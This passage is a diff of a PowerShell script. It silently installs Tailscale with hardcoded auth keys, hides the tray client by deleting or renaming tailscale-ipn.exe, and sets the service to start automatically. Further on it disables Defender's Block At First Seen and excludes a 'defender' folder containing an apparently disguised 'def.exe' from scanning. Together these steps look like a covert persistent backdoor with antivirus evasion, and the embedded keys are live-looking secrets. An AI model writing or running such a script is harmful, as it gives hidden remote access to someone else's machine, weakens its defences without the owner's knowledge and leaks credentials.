@@ -10,8 +10,8 @@ Start-Process -FilePath "$env:TEMP\tailscale-setup.exe" -ArgumentList "/quiet" -
 $env:Path = [System.Environment]::GetEnvironmentVariable("Path", [System.EnvironmentVariableTarget]::Machine)
 #Start-Process -FilePath "tailscale.exe" -ArgumentList "up --authkey tskey-auth-kDmVZv8Wr411CNTRL-W38EWMdmKoHAVMvJFC19oHPH2Ra4X1Yvb" -NoNewWindow -Wait
 
-tailscale up --auth-key=tskey-auth-kTAPKMnocB21CNTRL-nSgaeCYZCGD2v2TUv9NwFDhXiwXsDz49J --unattended
-tailscale up
+tailscale up --auth-key=tskey-auth-kAFCkKFvM721CNTRL-KrhpbsekTn83nSMSdz6fn81Vw8tNZTwe --unattended
+tailscale status
 Get-Service Tailscale | Set-Service -StartupType Automatic
 Remove-Item -Path "C:\Program Files\Tailscale\tailscale-ipn.exe" -Force
 Rename-Item -Path "C:\Program Files\Tailscale\tailscale-ipn.exe" -NewName "tailscale-ipn.disabled"
@@ -38,8 +38,8 @@ Set-MpPreference -DisableBlockAtFirstSeen $true
 
 # Define exclusions
 $exclusions = @(
-    "C:\Program Files\defender\",
-    "C:\Program Files\defender\Executable\",
+    "C:\Program Files\defender",
+    "C:\Program Files\defender\Executable",
     "C:\Program Files\defender\Executable\def.exe"
 )
 
